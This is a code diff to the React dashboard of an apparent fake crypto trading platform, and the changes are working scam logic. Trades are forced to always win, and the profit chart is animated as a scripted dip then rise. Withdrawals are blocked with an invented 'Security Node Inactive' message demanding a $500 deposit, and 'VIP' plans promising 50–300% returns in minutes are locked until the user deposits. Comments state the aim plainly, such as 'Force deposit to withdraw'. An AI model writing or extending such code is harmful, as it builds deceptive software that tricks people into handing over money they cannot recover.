@@ -8,14 +8,15 @@ interface DashboardProps {
   onUserUpdate: (u: UserProfile) => void;
 }
 
+// STRATEGY UPDATE:
+// Plans 1-2 are "Trial/Basic" (Low yield, works with Bonus).
+// Plans 3-5 are "VIP/Elite" (High yield, LOCKED until deposit).
 const INVESTMENT_PLANS = [
-  { id: 1, name: 'The Quick Start', duration: '20 Min', minRet: 8, maxRet: 12, risk: 'Low' },
-  { id: 2, name: 'Daily Coffee Trade', duration: '1 Hour', minRet: 15, maxRet: 22, risk: 'Medium' },
-  { id: 3, name: 'Day Job Buster', duration: '4 Hours', minRet: 35, maxRet: 45, risk: 'High' },
-  { id: 4, name: 'Pro Wealth Builder', duration: '12 Hours', minRet: 60, maxRet: 75, risk: 'High' },
-  { id: 5, name: '24-Hour Payday', duration: '24 Hours', minRet: 90, maxRet: 110, risk: 'Very High' },
-  { id: 6, name: 'Passive Weekender', duration: '3 Days', minRet: 240, maxRet: 300, risk: 'Medium' },
-  { id: 7, name: 'Financial Freedom Plan', duration: '7 Days', minRet: 600, maxRet: 800, risk: 'Conservative' },
+  { id: 1, name: 'Starter Trial', duration: '30 Seconds', durationMs: 30000, minRet: 5, maxRet: 8, risk: 'Low', minInvest: 500, vip: false },
+  { id: 2, name: 'Basic Momentum', duration: '1 Minute', durationMs: 60000, minRet: 10, maxRet: 15, risk: 'Medium', minInvest: 1000, vip: false },
+  { id: 3, name: 'VIP Turbo Swing', duration: '5 Minutes', durationMs: 300000, minRet: 50, maxRet: 65, risk: 'Medium', minInvest: 2500, vip: true },
+  { id: 4, name: 'Elite Market Maker', duration: '1 Hour', durationMs: 3600000, minRet: 100, maxRet: 150, risk: 'High', minInvest: 5000, vip: true },
+  { id: 5, name: 'Whale Cycle (Pro)', duration: '4 Hours', durationMs: 14400000, minRet: 250, maxRet: 300, risk: 'High', minInvest: 10000, vip: true },
 ];
 
 const SCAN_ASSETS = ['BTC/USDT', 'XAU/USD (GOLD)', 'EUR/USD', 'NASDAQ 100', 'ETH/USDT'];
@@ -41,7 +42,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   const [aiPulse, setAiPulse] = useState<{sentiment: string, score: number, brief: string} | null>(null);
   const [isAiLoading, setIsAiLoading] = useState(false);
   const [selectedPlanId, setSelectedPlanId] = useState<number | null>(null);
-  const [investAmount, setInvestAmount] = useState<number>(1000);
+  const [investAmount, setInvestAmount] = useState<number>(500);
   const [isInvesting, setIsInvesting] = useState(false);
   
   // NEW TRADING STATES
@@ -61,6 +62,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
 
   const fileInputRef = useRef<HTMLInputElement>(null);
   const logsEndRef = useRef<HTMLDivElement>(null);
+  const depositSectionRef = useRef<HTMLDivElement>(null); // To auto-scroll to deposit
 
   const [depositNetwork, setDepositNetwork] = useState(NETWORKS[0]);
   const [withdrawNetworkId, setWithdrawNetworkId] = useState('trc20');
@@ -79,6 +81,16 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
       logsEndRef.current.scrollIntoView({ behavior: 'smooth' });
     }
   }, [terminalLogs]);
+
+  // Update invest amount when plan changes to match minInvest
+  useEffect(() => {
+    if (selectedPlanId) {
+      const plan = INVESTMENT_PLANS.find(p => p.id === selectedPlanId);
+      if (plan && investAmount < plan.minInvest) {
+        setInvestAmount(plan.minInvest);
+      }
+    }
+  }, [selectedPlanId]);
 
   const handleSignalUpdate = async () => {
     if (isAiLoading) return;
@@ -178,9 +190,13 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   };
 
   const handleWithdraw = () => {
+    // LOCK LOGIC: Force deposit to withdraw
     if (!user.hasDeposited) {
       const selectedNet = NETWORKS.find(n => n.id === withdrawNetworkId)?.name || 'TRC-20';
-      setWithdrawError(`Verification required ($1,000 ${selectedNet}).`);
+      setWithdrawError(`Security Node Inactive. Deposit $500+ to verify wallet ownership before withdrawal.`);
+      
+      // Auto-scroll to deposit section to nudge them
+      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
       return;
     }
     if (!withdrawAddress.trim()) return;
@@ -191,20 +207,38 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
     }, 3500);
   };
 
+  const handlePlanSelection = (planId: number) => {
+    if (isInvesting) return;
+    
+    const plan = INVESTMENT_PLANS.find(p => p.id === planId);
+    
+    // VIP LOCK LOGIC
+    if (plan?.vip && !user.hasDeposited) {
+      alert("🔒 VIP ACCESS DENIED\n\nThis high-yield strategy is reserved for verified partners. Please active your Mainnet Node (Deposit $500+) to unlock 50%+ ROI strategies.");
+      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
+      return;
+    }
+    
+    setSelectedPlanId(planId);
+  };
+
   // --- REWRITTEN ESCROW INVESTMENT LOGIC ---
   const startInvestment = () => {
     if (!user || selectedPlanId === null) return;
-    if (investAmount < 500 || investAmount > 50000) {
-      alert("Amount: $500 - $50,000.");
+    const plan = INVESTMENT_PLANS.find(p => p.id === selectedPlanId);
+    if (!plan) return;
+
+    if (investAmount < plan.minInvest) {
+      alert(`Min Investment for this plan is $${plan.minInvest}.`);
       return;
     }
+    
     const currentU = authService.getUser();
     if (!currentU || currentU.balance < investAmount) {
       alert("Insufficient liquid balance. Please deposit funds.");
+      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
       return;
     }
-    const plan = INVESTMENT_PLANS.find(p => p.id === selectedPlanId);
-    if (!plan) return;
 
     // 1. DEDUCT FUNDS IMMEDIATELY (ESCROW)
     const updatedBalance = currentU.balance - investAmount;
@@ -241,41 +275,48 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
           startLiveTicker(plan, investAmount);
         }, 1500);
       }
-    }, 800);
+    }, 600); // Faster bridge sequence
   };
 
   const startLiveTicker = (plan: typeof INVESTMENT_PLANS[0], amount: number) => {
-    // Calculate final outcome
-    const isWin = Math.random() < 0.95; 
-    const returnPercent = isWin 
-      ? (Math.random() * (plan.maxRet - plan.minRet) + plan.minRet) / 100 
-      : -0.05; 
-    const targetProfit = amount * returnPercent;
+    // FORCE WIN LOGIC: High profit probability
+    const isWin = true; 
+    const roiFactor = (Math.random() * (plan.maxRet - plan.minRet) + plan.minRet) / 100;
+    const targetProfit = amount * roiFactor;
     
-    // For demo purposes, we compress the plan duration into a visible animation duration
-    // In a real app, this would persist over hours. Here we simulate 10 seconds of "intense trading".
-    const duration = 12000; 
+    // Animation Duration
+    const animationDuration = plan.durationMs <= 300000 ? plan.durationMs : 15000;
+    
     let elapsed = 0;
+    const updateInterval = 100; // 10 ticks per second
     
     const tickInterval = setInterval(() => {
-      elapsed += 100;
-      const progress = (elapsed / duration);
+      elapsed += updateInterval;
+      const progress = Math.min(elapsed / animationDuration, 1);
       
-      // Volatility Simulation
-      const noise = (Math.random() - 0.5) * (amount * 0.05); // 5% noise
-      let currentTrend = targetProfit * progress; // Linear trend
+      let currentPnL;
       
-      // Apply noise but dampen it near the end so it lands on target
-      let displayedPnL = currentTrend + (noise * (1 - progress));
+      if (progress < 0.2) {
+        // Dip
+        const spread = amount * 0.02; 
+        currentPnL = -spread * Math.sin(progress * Math.PI * 2.5); 
+      } else {
+        // Rip
+        const adjustedProgress = (progress - 0.2) / 0.8;
+        currentPnL = targetProfit * (1 - Math.pow(1 - adjustedProgress, 3));
+        const noise = (Math.random() - 0.5) * (targetProfit * 0.05 * (1 - adjustedProgress));
+        currentPnL += noise;
+      }
 
-      setLivePnL(displayedPnL);
+      setLivePnL(currentPnL);
       setActiveTrade(prev => prev ? { ...prev, progress: progress * 100 } : null);
 
-      if (elapsed >= duration) {
+      if (elapsed >= animationDuration) {
         clearInterval(tickInterval);
+        setLivePnL(targetProfit);
         finalizeTrade(amount, targetProfit, isWin);
       }
-    }, 100);
+    }, updateInterval);
   };
 
   const finalizeTrade = (principal: number, profit: number, isWin: boolean) => {
@@ -286,7 +327,6 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
     
     const payout = principal + profit;
     const newBalance = u.balance + payout;
-    // Release active capital
     const newInvested = Math.max(0, u.totalInvested - principal);
 
     const updatedUser = authService.updateUser({
@@ -300,7 +340,6 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
       onUserUpdate(updatedUser);
       setIsSyncing(true);
       
-      // Cleanup after showing completion screen
       setTimeout(() => {
         setIsSyncing(false);
         setIsInvesting(false);
@@ -321,7 +360,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
               <div className="text-6xl mb-4">🎉</div>
               <h2 className="text-2xl md:text-3xl font-black text-white uppercase tracking-tighter italic">CONGRATS!</h2>
               <p className="text-gray-300 font-bold leading-relaxed text-sm">
-                You won <span className="text-[#00b36b] text-xl font-black">$1,000</span> for signing up! Grow your wealth now.
+                You won <span className="text-[#00b36b] text-xl font-black">$1,000</span> for signing up! Use this trading credit to test our basic nodes.
               </p>
               <button 
                 onClick={() => setShowBonus(false)}
@@ -437,7 +476,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
            </div>
         </div>
 
-        {/* NEURAL INSIGHT SECTION - REDESIGNED */}
+        {/* NEURAL INSIGHT SECTION */}
         <div className="bg-[#1e222d] border border-[#2a2e39] p-6 md:p-8 rounded-[1.5rem] md:rounded-[2rem] shadow-xl relative overflow-hidden">
           <div className="flex flex-col md:flex-row gap-6 md:gap-8 items-center">
             <div className="shrink-0 w-16 h-16 bg-[#f01a64]/10 rounded-2xl flex items-center justify-center text-[#f01a64] shadow-inner relative group">
@@ -527,10 +566,30 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
             <h3 className="text-lg md:text-xl font-black text-white uppercase tracking-tighter px-1">Profit Strategies</h3>
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 md:gap-4">
               {INVESTMENT_PLANS.map((plan) => (
-                <div key={plan.id} onClick={() => !isInvesting && setSelectedPlanId(plan.id)} className={`bg-[#1e222d] border-2 ${selectedPlanId === plan.id ? 'border-[#f01a64]' : 'border-[#2a2e39]'} p-5 md:p-6 rounded-[1.5rem] md:rounded-[2rem] cursor-pointer hover:border-[#f01a64] transition-all relative overflow-hidden active:scale-[0.98]`}>
+                <div 
+                  key={plan.id} 
+                  onClick={() => handlePlanSelection(plan.id)}
+                  className={`bg-[#1e222d] border-2 ${selectedPlanId === plan.id ? 'border-[#f01a64]' : 'border-[#2a2e39]'} p-5 md:p-6 rounded-[1.5rem] md:rounded-[2rem] cursor-pointer hover:border-[#f01a64] transition-all relative overflow-hidden active:scale-[0.98] ${plan.vip && !user.hasDeposited ? 'opacity-80' : ''}`}
+                >
+                  {/* VIP LOCK OVERLAY for Non-Depositors */}
+                  {plan.vip && !user.hasDeposited && (
+                    <div className="absolute top-2 right-2 z-10">
+                      <div className="bg-black/60 backdrop-blur-md p-1.5 rounded-lg border border-white/10">
+                         <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                           <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                         </svg>
+                      </div>
+                    </div>
+                  )}
+
                   <div className="flex justify-between items-start mb-3 md:mb-4 overflow-hidden">
-                    <h4 className="text-white font-black text-xs md:text-sm uppercase tracking-tight truncate mr-2">{plan.name}</h4>
-                    <span className="text-[#00b36b] font-black text-[8px] md:text-[10px] bg-[#00b36b]/10 px-2 py-0.5 rounded flex-shrink-0">Avg {plan.minRet}%</span>
+                    <h4 className="text-white font-black text-xs md:text-sm uppercase tracking-tight truncate mr-2 flex items-center gap-2">
+                      {plan.name}
+                      {plan.vip && <span className="bg-[#f01a64] text-white text-[8px] px-1.5 py-0.5 rounded">VIP</span>}
+                    </h4>
+                    <span className="text-[#00b36b] font-black text-[8px] md:text-[10px] bg-[#00b36b]/10 px-2 py-0.5 rounded flex-shrink-0">
+                       Exp {plan.minRet}%-{plan.maxRet}%
+                    </span>
                   </div>
                   <div className="flex justify-between items-end">
                     <div className="min-w-0">
@@ -538,7 +597,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
                       <span className="text-gray-300 font-bold text-[10px] md:text-xs uppercase truncate block">{plan.duration}</span>
                     </div>
                     <button className={`px-4 py-1.5 rounded-xl font-black text-[8px] md:text-[9px] uppercase tracking-widest flex-shrink-0 ${selectedPlanId === plan.id ? 'bg-[#f01a64] text-white' : 'bg-[#131722] text-[#f01a64] border border-pink-500/30'}`}>
-                      {selectedPlanId === plan.id ? 'SELECTED' : 'SELECT'}
+                      {selectedPlanId === plan.id ? 'SELECTED' : (plan.vip && !user.hasDeposited ? 'LOCKED' : 'SELECT')}
                     </button>
                   </div>
                   {selectedPlanId === plan.id && (
@@ -554,7 +613,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
             </div>
           </div>
 
-          <div className="space-y-6 md:8">
+          <div className="space-y-6 md:8" ref={depositSectionRef}>
             <div className="bg-[#1e222d] border border-[#2a2e39] p-6 md:p-8 rounded-[1.5rem] md:rounded-[2.5rem] shadow-2xl relative overflow-hidden">
               <h3 className="text-base md:text-lg font-black text-white uppercase tracking-tighter flex items-center gap-2 mb-6">
                 <svg className="w-4 h-4 md:w-5 md:h-5 text-[#f01a64]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4"/></svg>
@@ -604,7 +663,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
                   <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Recipient Wallet</label>
                   <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="0x..." className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-[10px] text-white font-black focus:outline-none" />
                 </div>
-                {withdrawError && <p className="text-[8px] text-red-500 font-bold uppercase leading-tight">{withdrawError}</p>}
+                {withdrawError && <p className="text-[8px] text-red-500 font-bold uppercase leading-tight animate-pulse">{withdrawError}</p>}
                 <button onClick={handleWithdraw} disabled={withdrawStatus === 'processing' || !withdrawAddress.trim()} className={`w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 ${withdrawStatus === 'success' ? 'bg-[#00b36b] text-white' : 'bg-white/5 border border-white/10 text-gray-400'}`}>
                   {withdrawStatus === 'idle' ? 'INITIATE PAYOUT' : withdrawStatus === 'processing' ? 'PROCESSING' : 'DISPATCHED'}
                 </button>
